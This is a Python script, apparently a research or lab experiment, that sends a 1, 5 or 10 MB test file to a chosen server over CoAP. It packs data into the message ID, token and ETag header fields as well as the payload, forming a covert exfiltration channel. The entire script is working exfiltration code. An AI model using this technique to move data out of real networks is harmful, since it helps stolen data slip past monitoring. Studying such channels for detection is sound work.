import scapy.contrib.coap as CoAP
from scapy.all import send, IP, UDP
from util.cborctl import CBORIterator, readFromFile
from hashlib import sha256
import argparse, ipaddress, sys, socket, time


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (1, 5, 10 MB)")
parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
args = parser.parse_args()

size = int(args.Length)
if size not in [1,5,10]:
    print("Invalid exfiltration size!")
    sys.exit(1)

SERVER_IP = ""
try:
    ipaddress.ip_address(args.Target)
except ValueError:
    print("Invalid target server address!")
    sys.exit(1)

SERVER_IP = args.Target
PSIZE = 1470

print("\n====================CoAP EXFILTRATION====================\n")

content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
#print(type(content))
#print(len(content))
print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
print("Length of payload bytestream: " + str(len(content)) + "\n")

# token max => 15
# Max-Age => 4
# ETag => 8
"""x = CoAP.CoAP(code=1, msg_id=packet_counter+1, token=itertor.getNextBytes(15))
    x.options = [("ETag", itertor.getNextBytes(4)), ("Uri-Path", itertor.getNextBytes(1445))]

POST_packet = CoAP.CoAP(code=2, msg_id=99, token=byte_data[:15], paymark=b'\xFF')
POST_packet.options = [('Uri-Path', byte_data[15:20])]
POST_packet /= byte_data[20:]"""


# 0-1464 -> nur GET mit ETAG und Uri-Path options !!!
# normal 1472 -> wegen scapy bug + ETag ption = 1470
itertor = CBORIterator(content)
packet_counter = 0
print("START sending packets")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while itertor.getRemainingLength() >= PSIZE:
    x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
    x.options =  [("ETag", itertor.getNextBytes(4))]
    x /= itertor.getNextBytes(1447)
    #get = IP(dst=SERVER_IP) / UDP(dport=5683) / x
    #send(get, verbose=False)
    sock.sendto(bytes(x), (SERVER_IP, 5683))
    packet_counter += 1
    time.sleep(0.001)

x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
x.options =  [("ETag", itertor.getNextBytes(4))]
x /= itertor.getRemainingBytes()
#get = IP(dst=SERVER_IP) / UDP(dport=5683) / x
#send(get, verbose=False)
sock.sendto(bytes(x), (SERVER_IP, 5683))
print("FINISHED sending packets")
sock.close()
packet_counter += 1
print("Last packet length: " + str(len(x)))
print("Last packet:")
x.show()
print("Packets sent: " + str(packet_counter))
#print("Size: " + str(len(content)))